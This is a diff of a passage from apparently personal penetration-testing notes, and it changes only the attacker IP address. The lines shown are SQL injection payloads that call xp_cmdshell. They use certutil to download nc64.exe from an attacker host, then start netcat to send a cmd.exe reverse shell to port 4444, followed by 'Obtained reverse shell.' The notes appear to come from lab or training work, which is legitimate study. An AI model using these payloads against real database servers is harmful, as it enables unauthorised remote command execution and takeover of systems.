@@ -314,8 +314,8 @@ Enter followign commands one by one on vulnerbable place.
 
 Then you can try with nc64.exe as follows:
 
-';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.242/nc64.exe c:/windows/temp/nc64.exe";--
-';EXEC xp_cmdshell "c:\windows\temp\nc64.exe 192.168.45.242 4444 -e cmd.exe";--
+';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.241/nc64.exe c:/windows/temp/nc64.exe";--
+';EXEC xp_cmdshell "c:\windows\temp\nc64.exe 192.168.45.241 4444 -e cmd.exe";--
 ```
 
 5. Obtained reverse shell. 
